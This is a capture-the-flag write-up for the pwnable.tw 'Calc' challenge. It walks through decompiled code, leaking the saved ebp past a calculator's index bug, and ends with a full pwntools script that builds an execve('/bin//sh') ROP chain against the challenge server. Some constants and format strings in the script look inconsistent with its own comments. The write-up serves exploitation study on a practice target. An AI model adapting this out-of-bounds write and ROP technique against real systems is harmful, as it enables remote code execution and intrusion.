# Pwnable.tw - Calc
* Website : Pwnable.tw
* Challenge : Calc
* Writeup author : Redhung aka r3dhun9
>Contact :[Philip Chen (Facebook)](https://www.facebook.com/philip.chen.581)

## 0x00
**This challenge took me four days to solve it, and I think it is difficult although it is the third challenge in pwnable.tw !!** :cry: 

## 0x01

Let's use **IDA Pro** to decompile the binary first :
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
    ssignal(14, timeout);
    alarm(60);
    puts("=== Welcome to SECPROG calculator ===");
    fflush(stdout);
    calc();
    return puts("Merry Christmas!");
}
```
We'll see the program sets alarm to send a signal to itself, and then it calls **calc()**.

```c
unsigned int calc()
{
    int pool;
    int number[100];
    char expr;
    unsigned int canary;
    
    canary = __readgsdword(0x14u);
    while(1)
    {
        bzero(&expr, 0x400u);
        if(!get_expr((int)&expr, 1024))
            break;
        init_pool(&pool);
        if(parse_expr((int)&expr, &pool))
        {
            printf((const char *)&unk_80BF804, number[pool-1]);
            fflush(stdout);
        }
    }
    return __readgsdword(0x14u) ^ canary;
}
```
Let's analyze the function:

**Calc()** seems like a function which calculates the input and print it out.

**bzero()** is a function which works like **memset**.

**init_pool()** seems like a function which initiates the pool's number.

**get_expr()** seems like a function which filters the characters except for **+, -, *, /, %**.

**parse_expr()** contains **eval()**, and these two function are the points.

There is a lot of writeups describe the vulnerability, and I like [this writeup](https://drx.home.blog/2019/04/07/pwnable-tw-calc/) the most. :+1: 

The most difficult thing I encountered is **Leaking the saved ebp and calculating the offset.**

And we will get a negative number of saved ebp, I used **gdb** to find out the value on the stack and calculate their difference.

I got the **0x100000000**, that means our saved ebp must plus **0x100000000** everytime to get the true value.

But when I sent the bin_sh_address to the num[366], the integer will overflow, finally leading to failure.

My solution to this point comes below:

```python
true_ebp = leak_ebp + 0x100000000
bin_sh_address = true_ebp (+|-) offset - 0x100000000
```

Please see more information about how this works:[reference(difference between unsigned int & int)](https://segmentfault.com/q/1010000009639067)

## 0x02
Exploit:

```python
from pwn import *

"""
+360 => ebp
+361 => pop_eax_ret
+362 => 0xb
+363 => pop_edx_ecx_ebx_ret
+364 => 0
+365 => 0
+366 => address of /bin//sh
+367 => int 0x80
+368 => //sh 0x68732f2f
+369 => /bin 0x6e69622f
"""

r = remote('chall.pwnable.tw',10100)

pop_eax_ret = 0x0805c34b

pop_edx_ecx_ebx_ret = 0x080701d0

syscall = 0x08049a21

str_bin = 0x6e69622f

str_sh = 0x0068732f

def leak_ebp():
    r.recv()
    r.sendline('+360')
    ebp = int(r.recvline())
    ebp = ebp + 0x100000000
    bin_sh_addr = ebp - 0x100000000
    return bin_sh_addr

def set_rop():
    bin_sh_addr = leak_ebp()
    for i in range(361,370):
        r.sendline('+{}'.format(i))
        diff = int(r.recvline())
        print(diff)
        #set zero
        if diff < 0 :                              
            r.sendline('+{}+{}'.format(i,str(diff).strip('-')))
            r.recvline()
        elif diff > 0 :
            r.sendline('+{}-{}'.format(i,str(diff)))
            r.recvline()
        #set parameters
        if i == 361 :
            r.sendline('+361+'+str(int(pop_eax_ret)))
            r.recvline()
        elif i == 362 :
            r.sendline('+362+11')
            r.recvline()
        elif i == 363 :
            r.sendline('+363+'+str(int(pop_edx_ecx_ebx_ret)))
            r.recvline()
        elif i == 366 :
            r.sendline('+366'+str(bin_sh_addr))
            r.recvline()
        elif i == 367 :
            r.sendline('+367+'+str(int(syscall)))
            r.recvline()
        elif i == 368 :
            r.sendline('+368+'+str(int(str_bin)))
            r.recvline()
        elif i == 369 :
            r.sendline('+369+'+str(int(str_sh)))
            r.recvline()

def main():
    set_rop()
    r.interactive()

if __name__ == "__main__":
    main()
```
